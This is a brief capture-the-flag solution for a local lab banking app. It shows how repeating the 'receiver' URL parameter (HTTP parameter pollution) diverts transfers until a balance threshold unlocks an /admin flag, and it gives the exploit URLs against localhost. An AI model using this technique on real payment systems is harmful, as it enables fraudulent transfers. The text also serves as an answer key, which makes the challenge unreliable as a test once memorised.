when you sent request you can see this kind of link http://localhost:9999/index.php?sender=Groot&receiver=Rocket&amount=200

just add &receiver=Groot at the and of the link
like this: - 
http://localhost:9999/index.php?sender=Groot&receiver=Rocket&amount=200&receiver=Groot

do this till the balance of Groot reach upto or more than 2000 
then visit /admin and you will get the flag


---------------------------Update---------------------------------------------------------------
This update does not change solve. Just added minor checks
1)receiver and sender should not be same

2)number of receiver in url parameter should be 2 because than and only than it will update the value of reciver as the value of last reciver
so,
http://localhost:9999/index.php?sender=Rocket&receiver=Rocket&amount=200&receiver=Groot  --> this will send money from Rocket to Groot

http://localhost:9999/index.php?sender=Groot&receiver=Rocket&amount=200&receiver=Groot  --> this will say you cannot send money to yourself

http://localhost:9999/index.php?sender=Groot&receiver=Groot&amount=200&receiver=Rocket  --> this will send money from Groot to Rocket

value of second receiver would be consider as a value of receiver
